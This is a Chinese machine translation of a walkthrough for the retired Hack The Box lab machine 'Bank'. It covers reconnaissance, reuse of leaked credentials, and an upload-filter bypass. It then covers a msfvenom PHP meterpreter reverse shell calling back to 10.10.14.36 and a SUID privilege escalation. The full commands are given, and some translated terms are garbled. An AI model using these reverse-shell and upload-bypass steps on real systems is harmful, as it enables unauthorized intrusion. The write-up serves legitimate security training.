# 保持冷静，黑掉盒子银行

> 原文：<https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-bank/>

黑客盒子(HTB)是一个在线平台，让你测试你的渗透测试技能。它包含几个不断更新的挑战。有些是模拟真实世界的场景，有些更倾向于 CTF 风格的挑战。

**注**。*只允许报道退役的 HTB 机器。*

![Screenshot-2020-04-30-at-14.17.33](img/ff450c4249e2819ddfcb776927716fa5.png)

银行是一个相对简单的机器，但是正确的网络枚举是找到必要的输入数据的关键

我们将使用以下工具将机器典当到一个 [Kali Linux 机器](https://www.kali.org/)上:

*   nmap
*   gobuster
*   Searchsploit
*   msfconsole
*   metasploit
*   水表读数器
*   LinEnum

让我们开始吧。

## 第一步-侦察

开发一台机器的第一步是做一些扫描和侦察。

这是最重要的部分之一，因为它将决定你以后可以尝试利用什么。在这个阶段花更多的时间来获取尽可能多的信息总是更好的。

## 端口扫描

我将使用 Nmap(网络映射器)。Nmap 是一个用于网络发现和安全审计的免费开源工具。它使用原始 IP 数据包来确定网络上有哪些主机可用、这些主机提供什么服务、它们运行什么操作系统、使用什么类型的包过滤/防火墙以及许多其他特征。

这个工具有许多命令可以用来扫描网络。如果你想了解更多，你可以看一下文档[这里](https://tools.kali.org/information-gathering/nmap)。

![Screenshot-2020-05-17-at-21.57.03](img/91130b2d2f442a9273d77a7849034c32.png)

我使用以下命令来执行密集扫描:

```
nmap -A -v bank.htb
```

**-A:** 启用操作系统检测、版本检测、脚本扫描和跟踪路由

**-v:** 增加详细级别

**bank.htb:** 银行信箱的主机名

如果您发现结果有点太多，您可以执行另一个命令来只获取开放的端口。

```
nmap bank.htb
```

![Screenshot-2020-05-17-at-21.58.21](img/0ff6702a790840b45f66af8da7dfd220.png)

我们可以看到有 3 个开放的端口:

**端口 22** ，安全外壳(SSH)，安全登录，文件传输(scp，sftp)和端口转发

**端口 53** ，域名系统(DNS)

****端口** 80** ，最常被超文本传输协议使用

## 目录扫描

我用的是 Gobuster。Gobuster 是一个用 Go 编写的目录扫描器。关于工具[的更多信息请点击](https://tools.kali.org/web-applications/gobuster)。Gobuster 使用 Kali 上的单词表，它们位于****/usr/share/word lists****目录中。我用的是来自 **dirb** 和 **dirbuster** 的词表，但是你可以从**sec lists**这里下载更多词表

我对 dirb common.txt 单词表使用这个命令

```
gobuster dir -u bank.htb -w /usr/share/wordlists/dirb/common.txt
```

![Screenshot-2020-05-17-at-22.06.10](img/c7df1a692980b380f16ee5872234c6c3.png)

我能看见一些有趣的文件夹。我用不同的单词表做了另一个目录扫描。

```
gobuster dir -u bank.htb -w /usr/share/worldlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

![Screenshot-2020-05-17-at-22.06.18](img/daebfdcec60de343a63bab2a9d1eada0.png)

## 第 2 步-访问网页

在侦察阶段，我决定从 80 端口开始。它指向一个 Apache2 Ubuntu 默认页面。我们需要设置主机名。我们将遵循 HTB 机器的标准惯例

![Screenshot-2020-05-17-at-22.38.13](img/1854cf0ea1d201c6263928ecd09c5864.png)

我在/etc/hosts 文件中添加了 bank

```
nano /etc/hosts
```

随着

```
10.10.10.29     bank.htb
```

![Screenshot-2020-05-17-at-21.55.29](img/b44daa538fb623465079b7b1668e48fc.png)

我检查了文件

```
cat /etc/hosts
```

![Screenshot-2020-05-17-at-22.39.54](img/697f0215772085bc28c3ebcdf1ee04a6.png)

当我导航到 bank.htb 时，我现在可以看到一个登录页面

![Screenshot-2020-05-17-at-22.07.14](img/ce299128a4f46c23ef193eeeeea3669b.png)

我在“捉鬼敢死队”侦察中找到了一些文件夹。我导航到**/余额转移**

![Screenshot-2020-05-17-at-22.03.19](img/7033163e92ecfb56b8f48a223af4eafa.png)

我看了几份文件。所有文件似乎都加密了全名、电子邮件和密码。

![Screenshot-2020-05-17-at-22.04.41](img/40f14c277057d5cec2c94975cbffbaa4.png)

我返回主页，点击**大小**选项卡，对转账进行分类。我可以看到其中一个文件是不同的

![Screenshot-2020-05-17-at-22.03.53](img/9d66ace700020a8b30aa5d105776475a.png)

当我点击该文件时，我会在顶部看到一条错误消息。此文件的加密失败。我可以看到纯文本的所有细节

![Screenshot-2020-05-17-at-22.05.14](img/1d017cef440d9c3615d31b3ff486b696.png)

我返回登录面板，输入凭证。我现在可以进入 HTB 银行的仪表板了。该页面没有任何有趣的内容，所以我转到了**支持**页面

![Screenshot-2020-05-17-at-22.07.43](img/d9aa96d86d0c0696af24b78699dc8604.png)

在支持页面上，我可以上传文件。我会试着上传一个有效载荷

![Screenshot-2020-05-17-at-22.08.21](img/5f940091cbb336931dc46417e97d4571.png)

## **步骤 3 -** 使用 MSFvenom 精心设计漏洞

我们将使用 MSFvenom，它是一个有效载荷生成器。你可以在这里了解更多信息

![Screenshot-2020-05-17-at-22.09.17](img/9cf1f2e1837271e2026f6668ad4e8441.png)

但是首先，让我们看看在 **[Metasploit 框架](https://www.metasploit.com/)** 上，我们可以使用哪个有效载荷来精心设计我们的漏洞

我们知道我们需要创建一个**反向 shell** ，这是一种目标机器与攻击机器进行通信的 shell。攻击机器有一个侦听器端口，它在该端口上接收连接，通过使用，可以执行代码或命令。

![Screenshot-2019-08-06-at-22.53.40](img/0075e9178cceded42d519e4f5c8c2bc5.png)

[https://resources.infosecinstitute.com/icmp-reverse-shell/](https://resources.infosecinstitute.com/icmp-reverse-shell/)

反向的 TCP 外壳应该用于 PHP，我们将使用 **Meterpreter**

从攻击性安全网站上，我们得到了 Meterpreter 的这个定义

> Meterpreter 是一个高级的、可动态扩展的有效负载，它使用*内存中的* DLL 注入阶段，并在运行时通过网络进行扩展。它通过 stager 套接字进行通信，并提供全面的客户端 Ruby API。它具有命令历史，标签完成，渠道，等等。

你可以在这里阅读更多关于 Meterpreter [的信息](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)

![Screenshot-2020-05-19-at-20.58.43](img/c4fde945ea3e8d003358657c470e7f3a.png)

我启动 **Metasploit** 并搜索反向 TCP 有效负载。我使用以下命令

```
search php meterpreter reverse_tcp
```

我发现一个有趣的有效载荷，编号 594，这是一个**反向 TCP Stager** 。该负载通过反射 Dll 注入负载注入 meterpreter 服务器 DLL，并连接回攻击者

```
payload/php/meterpreter/reverse_tcp
```

现在让我们回到 **msfvenom** 来设计我们的漏洞

![Screenshot-2020-05-17-at-22.10.36](img/69edad575c6c87a0c55dc50cc4cd6b9f.png)

我使用以下命令

```
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.36 lport=443 -f raw > HTBbankshell.php
```

然后我用 **ls** 检查文件是否已经创建

![Screenshot-2020-05-17-at-22.10.44](img/a16164bd27e9c09dac971e290693fc8f.png)

我对文件进行了编目，以查看漏洞利用

```
cat HTBbankshell.php
```

![Screenshot-2020-05-17-at-22.11.25](img/d646a6ca36e371bcdd9c870a9278bbef.png)

我返回到支持页面。我在表单上添加标题、消息和上传文件

![Screenshot-2020-05-17-at-22.12.37](img/ce91f788cb721e27927e7aefc7ded9c3.png)

我单击提交按钮，看到一条错误消息。文件类型似乎不起作用

![Screenshot-2020-05-17-at-22.14.10](img/362b797cb6a7aa5bb616a738c7e5e13b.png)

我检查了源代码，看到一条注释指出文件扩展名为**。htb** 只是为了调试的目的才需要执行 php

![Screenshot-2020-05-17-at-22.14.42](img/dc98d3ddca3a68692c84ec2d9d49e99d.png)

然后我将我的有效载荷的扩展名从**HTBbankshell.php**改为 **HTBbankshell.htb**

![Screenshot-2020-05-17-at-22.15.42](img/9182047da7e4cda1a98fd08aeb81aeca.png)

我的文件现在可以上传到支持页面了

![Screenshot-2020-05-17-at-22.16.02](img/0ccfcc824d3fa6edaf2ee1f2acc47c76.png)

而且好像很管用！有效负载已上传到支持页面

![Screenshot-2020-05-17-at-22.16.38](img/bbad26bf5bdce32fa4ad396bd2c3e3d8.png)

## **步骤 4 -** 使用 Metasploit 设置监听器

回到 Metasploit，我使用下面的命令来设置有效负载处理程序

```
use exploit/multi/handler
```

我首先设置了有效载荷

```
set payload php/meterpreter/reverse_tcp
```

然后是 LHOST

```
set lhost 10.10.14.36
```

最后是 LPORT

```
set lport 4444
```

如果我们现在检查选项，我们应该看到一切都设置好了

![Screenshot-2020-05-17-at-22.18.28](img/830cc9c199390895d6c756413c86174e.png)

让我们运行漏洞。

该消息出现后

```
Started reverse TCP handler on 10.10.14.36:4444
```

返回浏览器并刷新托管恶意脚本的页面

```
bank.htb/uploads/HTBbankshell.php
```

![Screenshot-2020-05-17-at-22.17.09](img/f21c24bca2bf745ac3ddd9bc4e6e98aa.png)

然后，您应该会看到创建了一个 Meterpreter 会话

![Screenshot-2020-05-17-at-22.19.20](img/1e252235a08dae8a23013570ba1379f2.png)

我首先用返回调用进程的真实用户 id 的 getuid 和 sysinfo 收集一些信息

![Screenshot-2020-05-17-at-22.19.33](img/3b10844d7cbb5a05e0cabd14ef348f8f.png)

## **步骤 5 -寻找 user.txt 标志**

我开始导航到根目录并列出文件夹/文件。

![Screenshot-2020-05-17-at-22.20.44](img/84d50697310c9060dd4cf6b203e7243c.png)

我用移动到 **home** 目录

```
cd home
```

我可以看到一个叫**克里斯**的用户

![Screenshot-2020-05-17-at-22.20.54](img/721d4c66e59ae0d6e3e7869bfff8f228.png)

我移动到克里斯目录，当我列出文件时...

![Screenshot-2020-05-17-at-22.21.06](img/5b3ebb64668254435a6fbc75034a5328.png)

我找到了 **user.txt** 文件！为了读取文件的内容，我使用了以下命令

```
cat user.txt
```

现在我们有了用户标志，让我们找到根标志！

## 步骤 6 -执行权限提升

我尝试导航到根文件夹，但访问被拒绝

![Screenshot-2020-05-17-at-22.33.19](img/1abcf141d790283262a14eccc1a92d06.png)

我会用 **LinEnum** 来枚举这台机器的更多信息。 **LinEnum** 用于脚本化的本地 Linux 枚举和权限提升检查。更多信息[点击这里](https://github.com/rebootuser/LinEnum)

我从 **GitHub** 中获取 LinEnum

```
wget https://https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

![Screenshot-2020-05-17-at-22.43.05](img/1b425797275d4ad06ccf6b6ec79dcf89.png)

我用这个命令检查脚本是否被正确提取

```
ls -la
```

![Screenshot-2020-05-17-at-22.43.17](img/0da86b225db6023d6b5e32db41256fc3.png)

我使用以下命令

```
chmod 777 LinEnum.sh
```

更改文件权限，使其对每个人都可读、可写和可执行

![Screenshot-2020-05-17-at-22.43.34](img/9184a0c67ebccdd47151e9ce7263c033.png)

在 meterpreter 中，我用

```
lls -S "LinEnum.sh"
```

![Screenshot-2020-05-17-at-23.07.42](img/327b3b7ba02d96410908801b2e0d5dcd.png)

我在另一个终端上用

```
php -S 10.10.14.36:4444
```

![Screenshot-2020-05-17-at-22.45.45](img/bfa31c2e0c5506fa77eefc531bdecaed.png)

我键入以下命令在目标系统上获得标准 shell

```
shell
```

我生了一个 TTY 贝壳

```
python3 -c 'import pty;pty.spawn("/bin/bash/")'
```

我把文件传输到机器上

```
wget http://10.10.14.36:4444/LinEnum.sh -O /tmp/LinEnum.sh
```

我把文件从我的 Kali 盒复制到机器的 temp 文件夹

![Screenshot-2020-05-17-at-22.49.38](img/b837f6f758a6abc9bfead79505cc431d.png)

然后，我导航到临时文件夹，检查文件是否被正确移动

![Screenshot-2020-05-17-at-23.17.45](img/c1853ca8d93559c030421311bd7446d1.png)

然后，我用

```
sh ./LinEnum.sh
```

![Screenshot-2020-05-17-at-22.52.07](img/6abb7eb07e5add38a501f7dd7c9e3add.png)

扫描给了我很多信息。我寻找**有趣的文件**部分。我查了一下 **SUID 档案的**部分。 **SUID** 被定义为给予用户临时许可，以文件所有者的许可而不是运行程序/文件的用户的许可来运行程序/文件

我发现了一个有趣的文件

```
/var/htb/bin/emergency
```

![Screenshot-2020-05-17-at-22.53.13](img/54dbcf874610bcde717f934037170cd3.png)

我导航到 **var/htb/emergency**

![Screenshot-2020-05-17-at-23.19.03](img/77f4458985fe645b4fbdc9f240f710b9.png)

我用它运行

```
./emergency
```

而且问我要不要弄个根壳:)

![Screenshot-2020-05-17-at-23.20.07](img/b79a196f3e8ed40506bfe58d2819b587.png)

我有这台机器的超级用户权限

![Screenshot-2020-05-17-at-23.20.53](img/b9c329325649240ad364f99b3821236c.png)

我现在可以导航到根文件夹

![Screenshot-2020-05-17-at-23.21.31](img/80e5d0f93712f9cf033d44f17aa12c1f.png)

我找到了 **root.txt** 文件！

为了读取文件的内容，我使用了以下命令

```
cat root.txt
```

恭喜你。你找到了两面旗子！

* * *

请随时评论、提问或与朋友分享:)

你可以在这里看到更多我的文章

你可以在推特上关注我，也可以在 T2 的 LinkedIn 上关注我

还有别忘了# ****GetSecure**** ，#****be secure****&#****stay secure****！

* * *

**其他黑盒子文章**

*   [保持冷静，黑掉瘸子](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
*   [保持冷静，黑掉盒子——遗产](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
*   保持冷静，黑掉盒子
*   [保持冷静，黑盒子——哔](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)
*   [保持冷静，黑盒子——最佳](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-optimum/)
*   [保持冷静，黑掉盒子——北极](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-arctic/)
*   [保持冷静，黑掉盒子——爷爷](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-grandpa/)
*   [保持冷静，黑掉盒子奶奶](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-granny/)

![wallpaperflare.com_wallpaper-1](img/214991c8286ff9a3cd71edc5144da487.png)